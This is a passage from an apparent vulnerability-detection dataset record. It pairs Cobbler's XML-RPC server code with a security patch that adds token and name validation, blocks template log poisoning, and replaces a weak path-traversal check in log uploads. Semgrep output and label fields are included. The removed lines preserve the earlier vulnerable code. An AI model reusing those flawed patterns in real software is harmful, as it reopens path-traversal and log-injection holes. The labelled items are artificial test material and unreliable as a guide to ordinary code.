check to validate if it is a token.\n\n        __make_token() uses 25 as the length of bytes that means we need to padding bytes to have a 34 character str.\n        Because base64 specifies that the number of padding bytes are shown via equal characters, we have a 36 character\n        long str in the end in every case.\n\n        :param token: The str which should be checked.\n        :return: True in case the validation succeeds, otherwise False.\n        \"\"\"\n        return isinstance(token, str) and len(token) == 36\n\n    def __invalidate_expired_tokens(self):\n        \"\"\"\n        Deletes any login tokens that might have expired. Also removes expired events.\n        \"\"\"\n        timenow = time.time()\n        for token in list(self.token_cache.keys()):\n            (tokentime, user) = self.token_cache[token]\n            if timenow > tokentime + self.api.settings().auth_token_expiration:\n                self._log(\"expiring token\", token=token, debug=True)\n                del self.token_cache[token]\n        # and also expired objects\n        for oid in list(self.object_cache.keys()):\n            (tokentime, entry) = self.object_cache[oid]\n            if timenow > tokentime + CACHE_TIMEOUT:\n                del self.object_cache[oid]\n        for tid in list(self.events.keys()):\n            (eventtime, name, status, who) = self.events[tid]\n            if timenow > eventtime + EVENT_TIMEOUT:\n                del self.events[tid]\n            # logfile cleanup should be dealt w/ by logrotate\n\n    def __validate_user(self, input_user, input_password):\n        \"\"\"\n        Returns whether this user/pass combo should be given access to the Cobbler read-write API.\n\n        For the system user, this answer is always \"yes\", but it is only valid for the socket interface.\n\n        FIXME: currently looks for users in /etc/cobbler/auth.conf\n        Would be very nice to allow for PAM and/or just Kerberos.\n\n        :param input_user: The user to validate.\n        :param input_password: The password to validate.\n        :return: The return of the operation.\n        \"\"\"\n        return self.api.authenticate(input_user, input_password)\n\n    def __validate_token(self, token: str):\n        \"\"\"\n        Checks to see if an API method can be called when the given token is passed in. Updates the timestamp of the\n        token automatically to prevent the need to repeatedly call login(). Any method that needs access control should\n        call this before doing anything else.\n\n        :param token: The token to validate.\n        :return: True if access is allowed, otherwise False.\n        \"\"\"\n        self.__invalidate_expired_tokens()\n\n        if token in self.token_cache:\n            user = self.get_user_from_token(token)\n            if user == \"<system>\":\n                # system token is only valid over Unix socket\n                return False\n            self.token_cache[token] = (time.time(), user)  # update to prevent timeout\n            return True\n        else:\n            self._log(\"invalid token\", token=token)\n            return False\n\n    def __name_to_object(self, resource, name):\n        if resource.find(\"distro\") != -1:\n            return self.api.find_distro(name)\n        if resource.find(\"profile\") != -1:\n            return self.api.find_profile(name)\n        if resource.find(\"system\") != -1:\n            return self.api.find_system(name)\n        if resource.find(\"repo\") != -1:\n            return self.api.find_repo(name)\n        if resource.find(\"mgmtclass\") != -1:\n            return self.api.find_mgmtclass(name)\n        if resource.find(\"package\") != -1:\n            return self.api.find_package(name)\n        if resource.find(\"file\") != -1:\n            return self.api.find_file(name)\n        if resource.find(\"menu\") != -1:\n            return self.api.find_menu(name)\n        return None\n\n    def check_access_no_fail(self, token, resource, arg1=None, arg2=None) -> bool:\n        \"\"\"\n        This is called by the WUI to decide whether an element is editable or not. It differs form check_access in that\n        it is supposed to /not/ log the access checks (TBA) and does not raise exceptions.\n\n        :param token: The token to check access for.\n        :param resource: The resource for which access shall be checked.\n        :param arg1: Arguments to hand to the authorization provider.\n        :param arg2: Arguments to hand to the authorization provider.\n        :return: True if the object is editable or False otherwise.\n        \"\"\"\n        need_remap = False\n        for x in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            if arg1 is not None and resource.find(x) != -1:\n                need_remap = True\n                break\n\n        if need_remap:\n            # we're called with an object name, but need an object\n            arg1 = self.__name_to_object(resource, arg1)\n\n        try:\n            self.check_access(token, resource, arg1, arg2)\n            return True\n        except:\n            utils.log_exc()\n            return False\n\n    def check_access(self, token: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        Check if the token which was provided has access.\n\n        :param token: The token to check access for.\n        :param resource: The resource for which access shall be checked.\n        :param arg1: Arguments to hand to the authorization provider.\n        :param arg2: Arguments to hand to the authorization provider.\n        :return: Whether the authentication was successful or not.\n        \"\"\"\n        user = self.get_user_from_token(token)\n        if user == \"<DIRECT>\":\n            self._log(\"CLI Authorized\", debug=True)\n            return True\n        rc = self.api.authorize(user, resource, arg1, arg2)\n        self._log(\"%s authorization result: %s\" % (user, rc), debug=True)\n        if not rc:\n            raise CX(\"authorization failure for user %s\" % user)\n        return rc\n\n    def get_authn_module_name(self, token: str):\n        \"\"\"\n        Get the name of the currently used authentication module.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: The name of the module.\n        \"\"\"\n        user = self.get_user_from_token(token)\n        if user != \"<DIRECT>\":\n            raise CX(\"authorization failure for user %s attempting to access authn module name\" % user)\n        return self.api.get_module_name_from_file(\"authentication\", \"module\")\n\n    def login(self, login_user: str, login_password: str) -> str:\n        \"\"\"\n        Takes a username and password, validates it, and if successful returns a random login token which must be used\n        on subsequent method calls. The token will time out after a set interval if not used. Re-logging in permitted.\n\n        :param login_user: The username which is used to authenticate at Cobbler.\n        :param login_password:  The password which is used to authenticate at Cobbler.\n        :return: The token which can be used further on.\n        \"\"\"\n        # if shared secret access is requested, don't bother hitting the auth plugin\n        if login_user == \"\":\n            if login_password == self.shared_secret:\n                return self.__make_token(\"<DIRECT>\")\n            else:\n                utils.die(\"login failed\")\n\n        # This should not log to disk OR make events as we're going to call it like crazy in CobblerWeb. Just failed\n        # attempts.\n        if self.__validate_user(login_user, login_password):\n            token = self.__make_token(login_user)\n            return token\n        else:\n            utils.die(\"login failed (%s)\" % login_user)\n\n    def logout(self, token: str) -> bool:\n        \"\"\"\n        Retires a token ahead of the timeout.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: if operation was successful or not\n        \"\"\"\n        self._log(\"logout\", token=token)\n        if token in self.token_cache:\n            del self.token_cache[token]\n            return True\n        return False\n\n    def token_check(self, token: str) -> bool:\n        \"\"\"\n        Checks to make sure a token is valid or not.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: if operation was successful or not\n        \"\"\"\n        return self.__validate_token(token)\n\n    def sync_dhcp(self, token: str):\n        \"\"\"\n        Run sync code, which should complete before XMLRPC timeout. We can't do reposync this way. Would be nice to\n        send output over AJAX/other later.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n        self._log(\"sync_dhcp\", token=token)\n        self.check_access(token, \"sync\")\n        self.api.sync_dhcp()\n        return True\n\n    def sync(self, token: str):\n        \"\"\"\n        Run sync code, which should complete before XMLRPC timeout. We can't do reposync this way. Would be nice to\n        send output over AJAX/other later.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n        # FIXME: performance\n        self._log(\"sync\", token=token)\n        self.check_access(token, \"sync\")\n        self.api.sync()\n        return True\n\n    def read_autoinstall_template(self, file_path: str, token: str) -> str:\n        \"\"\"\n        Read an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: file content\n        \"\"\"\n        what = \"read_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        return self.autoinstall_mgr.read_autoinstall_template(file_path)\n\n    def write_autoinstall_template(self, file_path: str, data: str, token: str):\n        \"\"\"\n        Write an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param data: new file content\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: bool if operation was successful\n        \"\"\"\n\n        what = \"write_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.write_autoinstall_template(file_path, data)\n\n        return True\n\n    def remove_autoinstall_template(self, file_path: str, token: str):\n        \"\"\"\n        Remove an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: bool if operation was successful\n        \"\"\"\n        what = \"write_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.remove_autoinstall_template(file_path)\n\n        return True\n\n    def read_autoinstall_snippet(self, file_path: str, token: str) -> str:\n        \"\"\"\n        Read an automatic OS installation snippet file\n\n        :param file_path: automatic OS installation snippet file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: file content\n        \"\"\"\n        what = \"read_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        return self.autoinstall_mgr.read_autoinstall_snippet(file_path)\n\n    def write_autoinstall_snippet(self, file_path: str, data: str, token: str) -> bool:\n        \"\"\"\n        Write an automatic OS installation snippet file\n\n        :param file_path: automatic OS installation snippet file path\n        :param data: new file content\n        :param token: Cobbler token, obtained form login()\n        :return: if operation was successful\n        \"\"\"\n\n        what = \"write_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.write_autoinstall_snippet(file_path, data)\n\n        return True\n\n    def remove_autoinstall_snippet(self, file_path: str, token: str):\n        \"\"\"\n        Remove an automated OS installation snippet file\n\n        :param file_path: automated OS installation snippet file path\n        :param token: Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n\n        what = \"remove_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.remove_autoinstall_snippet(file_path)\n\n        return True\n\n    def get_config_data(self, hostname: str) -> str:\n        \"\"\"\n        Generate configuration data for the system specified by hostname.\n\n        :param hostname: The hostname for what to get the config data of.\n        :return: The config data as a json for Koan.\n        \"\"\"\n        self._log(\"get_config_data for %s\" % hostname)\n        obj = configgen.ConfigGen(self.api, hostname)\n        return obj.gen_config_data_for_koan()\n\n    def clear_system_logs(self, object_id: str, token: str):\n        \"\"\"\n        clears console logs of a system\n\n        :param object_id: The object id of the system to clear the logs of.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the operation succeeds.\n        \"\"\"\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"clear_system_logs\", obj)\n        self.api.clear_logs(obj)\n        return True\n\n\n# *********************************************************************************\n\n\nclass RequestHandler(SimpleXMLRPCRequestHandler):\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.end_headers()\n\n    # Add these headers to all responses\n    def end_headers(self):\n        self.send_header(\"Access-Control-Allow-Headers\",\n                         \"Origin, X-Requested-With, Content-Type, Accept\")\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        SimpleXMLRPCRequestHandler.end_headers(self)\n\n\nclass CobblerXMLRPCServer(ThreadingMixIn, xmlrpc.server.SimpleXMLRPCServer):\n    \"\"\"\n    This is the class for the main Cobbler XMLRPC Server. This class does not directly contain all XMLRPC methods. It\n    just starts the server.\n    \"\"\"\n\n    def __init__(self, args):\n        \"\"\"\n        The constructor for the main Cobbler XMLRPC server.\n\n        :param args: Arguments which are handed to the Python XMLRPC server.\n        \"\"\"\n        self.allow_reuse_address = True\n        xmlrpc.server.SimpleXMLRPCServer.__init__(self, args, requestHandler=RequestHandler)\n\n\n# *********************************************************************************\n\n\nclass ProxiedXMLRPCInterface:\n\n    def __init__(self, api, proxy_class):\n        \"\"\"\n        This interface allows proxying request through another class.\n\n        :param api: The api object to resolve information with\n        :param proxy_class: The class which proxies the requests.\n        \"\"\"\n        self.proxied = proxy_class(api)\n        self.logger = self.proxied.api.logger\n\n    def _dispatch(self, method, params, **rest):\n        \"\"\"\n        This method magically registers the methods at the XMLRPC interface.\n\n        :param method: The method to register.\n        :param params: The params for the method.\n        :param rest: This gets dropped curently.\n        :return: The result of the method.\n        \"\"\"\n        # ToDo: Drop rest param\n        if method.startswith('_'):\n            raise CX(\"forbidden method\")\n\n        if not hasattr(self.proxied, method):\n            raise CX(\"unknown remote method '%s'\" % method)\n\n        method_handle = getattr(self.proxied, method)\n\n        # FIXME: see if this works without extra boilerplate\n        try:\n            return method_handle(*params)\n        except Exception as e:\n            utils.log_exc()\n            raise e\n", "patch": "@@ -21,20 +21,26 @@\n import base64\n import errno\n import fcntl\n+import keyword\n import logging\n import os\n import random\n import stat\n import time\n+import re\n import xmlrpc.server\n from socketserver import ThreadingMixIn\n from threading import Thread\n-from typing import Dict, List, Optional, Tuple, Union\n+from typing import Dict, List, Optional, Union\n from xmlrpc.server import SimpleXMLRPCRequestHandler\n \n-from cobbler import autoinstall_manager, configgen, tftpgen, utils\n+from cobbler import autoinstall_manager\n+from cobbler import configgen\n+from cobbler.items import item, package, system, image, profile, repo, mgmtclass, distro, file, menu\n+from cobbler import tftpgen\n+from cobbler import utils\n from cobbler.cexceptions import CX\n-from cobbler.items import distro, file, image, menu, mgmtclass, package, profile, repo, system\n+from cobbler.validate import validate_autoinstall_script_name, validate_obj_id, validate_obj_name\n \n EVENT_TIMEOUT = 7 * 24 * 60 * 60  # 1 week\n CACHE_TIMEOUT = 10 * 60  # 10 minutes\n@@ -122,8 +128,8 @@ def __init__(self, api):\n         :param api: The api to use for resolving the required information.\n         \"\"\"\n         self.api = api\n-        self.logger = self.api.logger\n-        self.token_cache: Dict[str, Tuple] = {}\n+        self.logger = logging.getLogger()\n+        self.token_cache: Dict[str, tuple] = {}\n         self.object_cache = {}\n         self.timestamp = self.api.last_modified_time()\n         self.events = {}\n@@ -545,31 +551,33 @@ def get_user_from_token(self, token: str):\n         :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n         :return: The username if the token was valid.\n         :raises CX: If the token supplied to the function is invalid.\n+        :raises ValueError: In case \"token\" did not fulfil the requirements to be a token.\n         \"\"\"\n+        if not CobblerXMLRPCInterface.__is_token(token):\n+            raise ValueError(\"\\\"token\\\" did not have the correct format or type!\")\n         if token not in self.token_cache:\n             raise CX(\"invalid token: %s\" % token)\n         else:\n             return self.token_cache[token][1]\n \n-    def _log(self, msg, user=None, token=None, name=None, object_id=None, attribute=None, debug: bool = False,\n-             error: bool = False):\n+    def _log(self, msg: str, token: Optional[str] = None, name: Optional[str] = None, object_id: Optional[str] = None,\n+             attribute: Optional[str] = None, debug: bool = False, error: bool = False):\n         \"\"\"\n         Helper function to write data to the log file from the XMLRPC remote implementation.\n         Takes various optional parameters that should be supplied when known.\n \n         :param msg: The message to log.\n-        :param user: When a user is associated with the action it should be supplied.\n         :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n         :param name: The name of the object should be supplied when it is known.\n         :param object_id: The object id should be supplied when it is known.\n         :param attribute: Additional attributes should be supplied if known.\n         :param debug: If the message logged is a debug message.\n         :param error: If the message logged is an error message.\n         \"\"\"\n+        if not all((isinstance(error, bool), isinstance(debug, bool), isinstance(msg, str))):\n+            return\n         # add the user editing the object, if supplied\n         m_user = \"?\"\n-        if user is not None:\n-            m_user = user\n         if token is not None:\n             try:\n                 m_user = self.get_user_from_token(token)\n@@ -579,13 +587,19 @@ def _log(self, msg, user=None, token=None, name=None, object_id=None, attribute=\n         msg = \"REMOTE %s; user(%s)\" % (msg, m_user)\n \n         if name is not None:\n+            if not validate_obj_name(name):\n+                return\n             msg = \"%s; name(%s)\" % (msg, name)\n \n         if object_id is not None:\n+            if not validate_obj_id(object_id):\n+                return\n             msg = \"%s; object_id(%s)\" % (msg, object_id)\n \n         # add any attributes being modified, if any\n         if attribute:\n+            if (isinstance(attribute, str) and attribute.isidentifier()) or keyword.iskeyword(attribute):\n+                return\n             msg = \"%s; attribute(%s)\" % (msg, attribute)\n \n         # log to the correct logger\n@@ -1842,6 +1856,10 @@ def modify_setting(self, setting_name: str, value, token: str) -> int:\n         :param token: The API-token obtained via the login() method.\n         :return: 0 on success, 1 on error.\n         \"\"\"\n+        if not self.api.settings().allow_dynamic_settings:\n+            self._log(\"modify_setting - feature turned off but was tried to be accessed\", token=token)\n+            return 1\n+        self._log(\"modify_setting(%s)\" % setting_name, token=token)\n         if not hasattr(self.api.settings(), setting_name):\n             self.logger.warning(\"Setting did not exist!\")\n             return 1\n@@ -1880,7 +1898,7 @@ def auto_add_repos(self, token: str):\n         self.api.auto_add_repos()\n         return True\n \n-    def __is_interface_field(self, field_name) -> bool:\n+    def __is_interface_field(self, field_name: str) -> bool:\n         \"\"\"\n         Checks if the field in ``f`` is related to a network interface.\n \n@@ -2276,17 +2294,20 @@ def generate_bootcfg(self, profile: str = None, system: str = None, **rest) -> s\n         self._log(\"generate_bootcfg\")\n         return self.api.generate_bootcfg(profile, system)\n \n-    def generate_script(self, profile: str = None, system: str = None, name: str = None, **rest) -> str:\n+    def generate_script(self, profile: Optional[str] = None, system: Optional[str] = None, name: str = \"\") -> str:\n         \"\"\"\n-        Not known what this does exactly.\n+        This generates the autoinstall script for a system or profile. Profile and System cannot be both given, if they\n+        are, Profile wins.\n \n-        :param profile: Not known for what the profile is needed.\n-        :param system: Not known for what the system is needed.\n-        :param name: Name of the generated script.\n-        :param rest: This is dropped in this method since it is not needed here.\n+        :param profile: The profile name to generate the script for.\n+        :param system: The system name to generate the script for.\n+        :param name: Name of the generated script. Must only contain alphanumeric characters, dots and underscores.\n         :return: Some generated script.\n         \"\"\"\n-        self._log(\"generate_script, name is %s\" % str(name))\n+        # This is duplicated from tftpgen.py to prevent log poisoning via a template engine (Cheetah, Jinja2).\n+        if not validate_autoinstall_script_name(name):\n+            raise ValueError(\"\\\"name\\\" handed to generate_script was not valid!\")\n+        self._log(\"generate_script, name is \\\"%s\\\"\" % name)\n         return self.api.generate_script(profile, system, name)\n \n     def get_blended_data(self, profile=None, system=None):\n@@ -2627,20 +2648,22 @@ def disable_netboot(self, name, token=None, **rest) -> bool:\n         self.api.sync_dhcp()\n         return True\n \n-    def upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest):\n+    def upload_log_data(self, sys_name: str, file: str, size: int, offset: int, data: bytes,\n+                        token: Optional[str] = None) -> bool:\n         \"\"\"\n         This is a logger function used by the \"anamon\" logging system to upload all sorts of misc data from Anaconda.\n         As it's a bit of a potential log-flooder, it's off by default and needs to be enabled in our settings.\n \n         :param sys_name: The name of the system for which to upload log data.\n         :param file: The file where the log data should be put.\n-        :param size: The size of the data which will be recieved.\n+        :param size: The size of the data which will be received.\n         :param offset: The offset in the file where the data will be written to.\n         :param data: The data that should be logged.\n         :param token: The API-token obtained via the login() method.\n-        :param rest: This is dropped in this method since it is not needed here.\n         :return: True if everything succeeded.\n         \"\"\"\n+        if not self.__validate_log_data_params(sys_name, file, size, offset, data, token):\n+            return False\n         self._log(\"upload_log_data (file: '%s', size: %s, offset: %s)\" % (file, size, offset), token=token,\n                   name=sys_name)\n \n@@ -2650,59 +2673,82 @@ def upload_log_data(self, sys_name, file, size, offset, data, token=None, **rest\n             return False\n \n         # Find matching system record\n-        systems = self.api.systems()\n-        obj = systems.find(name=sys_name)\n+\n+        obj = self.api.find_system(name=sys_name)\n         if obj is None:\n             # system not found!\n             self._log(\"upload_log_data - WARNING - system '%s' not found in Cobbler\" % sys_name, token=token,\n                       name=sys_name)\n+            return False\n \n-        return self.__upload_file(sys_name, file, size, offset, data)\n+        return self.__upload_file(obj.name, file, size, offset, data)\n+\n+    def __validate_log_data_params(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes,\n+                                   token: Optional[str] = None) -> bool:\n+        # Validate all types\n+        if not (isinstance(sys_name, str) and isinstance(logfile_name, str) and isinstance(size, int)\n+                and isinstance(offset, int) and isinstance(data, bytes)):\n+            self.logger.warning(\"upload_log_data - One of the parameters handed over had an invalid type!\")\n+            return False\n+        if token is not None and not isinstance(token, str):\n+            self.logger.warning(\"upload_log_data - token was given but had an invalid type.\")\n+            return False\n+        # Validate sys_name with item regex\n+        if not re.fullmatch(item.RE_OBJECT_NAME, sys_name):\n+            self.logger.warning(\"upload_log_data - The provided sys_name contained invalid characters!\")\n+            return False\n+        # Validate logfile_name - this uses the script name validation, possibly we need our own for this one later\n+        if not validate_autoinstall_script_name(logfile_name):\n+            self.logger.warning(\"upload_log_data - The provided file contained invalid characters!\")\n+            return False\n+        return True\n \n-    def __upload_file(self, sys_name, file, size, offset, data):\n+    def __upload_file(self, sys_name: str, logfile_name: str, size: int, offset: int, data: bytes) -> bool:\n         \"\"\"\n         Files can be uploaded in chunks, if so the size describes the chunk rather than the whole file. The offset\n         indicates where the chunk belongs the special offset -1 is used to indicate the final chunk.\n \n         :param sys_name: the name of the system\n-        :param file: the name of the file\n+        :param logfile_name: the name of the file\n         :param size: size of contents (bytes)\n         :param offset: the offset of the chunk\n         :param data: base64 encoded file contents\n         :return: True if the action succeeded.\n         \"\"\"\n-        contents = base64.decodestring(data)\n+        contents = base64.decodebytes(data)\n         del data\n         if offset != -1:\n             if size is not None:\n                 if size != len(contents):\n                     return False\n \n-        # XXX - have an incoming dir and move after upload complete\n-        # SECURITY - ensure path remains under uploadpath\n-        tt = str.maketrans(\"/\", \"+\")\n-        fn = str.translate(file, tt)\n-        if fn.startswith('..'):\n-            raise CX(\"invalid filename used: %s\" % fn)\n+        # FIXME: Get the base directory from Cobbler app-settings\n+        anamon_base_directory = \"/var/log/cobbler/anamon\"\n+        anamon_sys_directory = os.path.join(anamon_base_directory, sys_name)\n+\n+        file_name = os.path.join(anamon_sys_directory, logfile_name)\n+        normalized_path = os.path.normpath(file_name)\n+        if not normalized_path.startswith(anamon_sys_directory):\n+            self.logger.warning(\"upload_log_data: built path for the logfile was outside of the Cobbler-Anamon log \"\n+                                \"directory!\")\n+            return False\n \n-        # FIXME ... get the base dir from cobbler settings()\n-        udir = \"/var/log/cobbler/anamon/%s\" % sys_name\n-        if not os.path.isdir(udir):\n-            os.mkdir(udir, 0o755)\n+        if not os.path.isdir(anamon_sys_directory):\n+            os.mkdir(anamon_sys_directory, 0o755)\n \n-        fn = \"%s/%s\" % (udir, fn)\n         try:\n-            st = os.lstat(fn)\n+            st = os.lstat(file_name)\n         except OSError as e:\n             if e.errno == errno.ENOENT:\n                 pass\n             else:\n                 raise\n         else:\n             if not stat.S_ISREG(st.st_mode):\n-                raise CX(\"destination not a file: %s\" % fn)\n+                raise CX(\"destination not a file: %s\" % file_name)\n \n-        fd = os.open(fn, os.O_RDWR | os.O_CREAT, 0o644)\n+        # TODO: See if we can simplify this at a later point\n+        fd = os.open(file_name, os.O_RDWR | os.O_CREAT | os.O_CLOEXEC, 0o644)\n         # log_error(\"fd=%r\" %fd)\n         try:\n             if offset == 0 or (offset == -1 and size == len(contents)):\n@@ -3163,6 +3209,20 @@ def __make_token(self, user: str) -> str:\n         self.token_cache[b64] = (time.time(), user)\n         return b64\n \n+    @staticmethod\n+    def __is_token(token: str) -> bool:\n+        \"\"\"\n+        Simple check to validate if it is a token.\n+\n+        __make_token() uses 25 as the length of bytes that means we need to padding bytes to have a 34 character str.\n+        Because base64 specifies that the number of padding bytes are shown via equal characters, we have a 36 character\n+        long str in the end in every case.\n+\n+        :param token: The str which should be checked.\n+        :return: True in case the validation succeeds, otherwise False.\n+        \"\"\"\n+        return isinstance(token, str) and len(token) == 36\n+\n     def __invalidate_expired_tokens(self):\n         \"\"\"\n         Deletes any login tokens that might have expired. Also removes expired events.", "file_path": "files/2021_10/1106", "file_language": "py", "file_name": "cobbler/remote.py", "outdated_file_modify": 0, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 1, "static": {"rats": [false, []], "semgrep": [true, ["       python.lang.security.use-defused-xmlrpc.use-defused-xmlrpc                        \n          Detected use of xmlrpc. xmlrpc is not inherently safe from vulnerabilities. Use\n          defusedxml.xmlrpc instead.                                                     \n          Details: https://sg.run/weqY                                                   \n           35\u2506 from xmlrpc.server import SimpleXMLRPCRequestHandler", "       python.lang.security.use-defused-xmlrpc.use-defused-xmlrpc                        \n          Detected use of xmlrpc. xmlrpc is not inherently safe from vulnerabilities. Use\n          defusedxml.xmlrpc instead.                                                     \n          Details: https://sg.run/weqY                                                   \n\n           31\u2506 import xmlrpc.server"]]}, "target": -1, "function_before": [], "function_after": []}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/cobbler%2Ftftpgen.py", "code": "\"\"\"\nGenerate files provided by TFTP server based on Cobbler object tree.\nThis is the code behind 'cobbler sync'.\n\nCopyright 2006-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\nimport logging\nimport os\nimport os.path\nimport re\nimport socket\nfrom typing import Dict, List, Optional\n\nfrom cobbler import enums, templar, utils\nfrom cobbler.cexceptions import CX\nfrom cobbler.enums import Archs\nfrom cobbler.validate import validate_autoinstall_script_name\n\n\nclass TFTPGen:\n    \"\"\"\n    Generate files provided by TFTP server\n    \"\"\"\n\n    def __init__(self, collection_mgr):\n        \"\"\"\n        Constructor\n        \"\"\"\n        self.collection_mgr = collection_mgr\n        self.logger = logging.getLogger()\n        self.api = collection_mgr.api\n        self.distros = collection_mgr.distros()\n        self.profiles = collection_mgr.profiles()\n        self.systems = collection_mgr.systems()\n        self.settings = collection_mgr.settings()\n        self.repos = collection_mgr.repos()\n        self.images = collection_mgr.images()\n        self.menus = collection_mgr.menus()\n        self.templar = templar.Templar(collection_mgr)\n        self.bootloc = self.settings.tftpboot_location\n\n    def copy_bootloaders(self, dest):\n        \"\"\"\n        Copy bootloaders to the configured tftpboot directory\n        NOTE: we support different arch's if defined in our settings file.\n        \"\"\"\n        src = self.settings.bootloaders_dir\n        dest = self.bootloc\n        # Unfortunately using shutils copy_tree the dest directory must not exist, but we must not delete an already\n        # partly synced /srv/tftp dir here. rsync is very convenient here, being very fast on an already copied folder.\n        utils.subprocess_call(\n            [\"rsync\", \"-rpt\", \"--copy-links\", \"--exclude=.cobbler_postun_cleanup\", \"{src}/\".format(src=src), dest],\n            shell=False\n        )\n        src = self.settings.grubconfig_dir\n        utils.subprocess_call(\n            [\"rsync\", \"-rpt\", \"--copy-links\", \"--exclude=README.grubconfig\", \"{src}/\".format(src=src), dest],\n            shell=False\n        )\n\n    def copy_images(self):\n        \"\"\"\n        Like copy_distros except for images.\n        \"\"\"\n        errors = list()\n        for i in self.images:\n            try:\n                self.copy_single_image_files(i)\n            except CX as e:\n                errors.append(e)\n                self.logger.error(e.value)\n\n    def copy_single_distro_file(self, d_file: str, distro_dir: str, symlink_ok: bool):\n        \"\"\"\n        Copy a single file (kernel/initrd) to distro's images directory\n\n        :param d_file:     distro's kernel/initrd absolut or remote file path value\n        :param distro_dir: directory (typically in {www,tftp}/images) where to copy the file\n        :param symlink_ok: whethere it is ok to symlink the file. Typically false in case the file is used by daemons\n                            run in chroot environments (tftpd,..)\n        :raises FileNotFoundError: Raised in case no kernel was found.\n        \"\"\"\n        full_path = utils.find_kernel(d_file)\n\n        if not full_path:\n            full_path = utils.find_initrd(d_file)\n\n        if full_path is None or not full_path:\n            # Will raise if None or an empty str\n            raise FileNotFoundError(\"No kernel found at \\\"%s\\\", tried to copy to: \\\"%s\\\"\" % (d_file, distro_dir))\n\n        # Koan manages remote kernel/initrd itself, but for consistent PXE\n        # configurations the synchronization is still necessary\n        if not utils.file_is_remote(full_path):\n            b_file = os.path.basename(full_path)\n            dst = os.path.join(distro_dir, b_file)\n            utils.linkfile(full_path, dst, symlink_ok=symlink_ok, api=self.api)\n        else:\n            b_file = os.path.basename(full_path)\n            dst = os.path.join(distro_dir, b_file)\n            utils.copyremotefile(full_path, dst, api=None)\n\n    def copy_single_distro_files(self, d, dirtree, symlink_ok: bool):\n        \"\"\"\n        Copy the files needed for a single distro.\n\n        :param d: The distro to copy.\n        :param dirtree: This is the root where the images are located. The folder \"images\" gets automatically appended.\n        :param symlink_ok: If it is okay to use a symlink to link the destination to the source.\n        \"\"\"\n\n        distros = os.path.join(dirtree, \"images\")\n        distro_dir = os.path.join(distros, d.name)\n        utils.mkdir(distro_dir)\n        self.copy_single_distro_file(d.kernel, distro_dir, symlink_ok)\n        self.copy_single_distro_file(d.initrd, distro_dir, symlink_ok)\n\n    def copy_single_image_files(self, img):\n        \"\"\"\n        Copies an image to the images directory of Cobbler.\n\n        :param img: The image to copy.\n        \"\"\"\n        images_dir = os.path.join(self.bootloc, \"images2\")\n        filename = img.file\n        if not os.path.exists(filename):\n            # likely for virtual usage, cannot use\n            return\n        if not os.path.exists(images_dir):\n            os.makedirs(images_dir)\n        newfile = os.path.join(images_dir, img.name)\n        utils.linkfile(filename, newfile, api=self.api)\n\n    def write_all_system_files(self, system, menu_items):\n        \"\"\"\n        Writes all files for tftp for a given system with the menu items handed to this method. The system must have a\n        profile attached. Otherwise this method throws an error.\n\n        :param system: The system to generate files for.\n        :param menu_items: TODO\n        \"\"\"\n        profile = system.get_conceptual_parent()\n        if profile is None:\n            raise CX(\"system %(system)s references a missing profile %(profile)s\" % {\"system\": system.name,\n                                                                                     \"profile\": system.profile})\n\n        distro = profile.get_conceptual_parent()\n        image_based = False\n        image = None\n        if distro is None:\n            if profile.COLLECTION_TYPE == \"profile\":\n                raise CX(\"profile %(profile)s references a missing distro %(distro)s\" % {\"profile\": system.profile,\n                                                                                         \"distro\": profile.distro})\n            else:\n                image_based = True\n                image = profile\n\n        pxe_metadata = {'menu_items': menu_items}\n\n        # hack: s390 generates files per system not per interface\n        if not image_based and 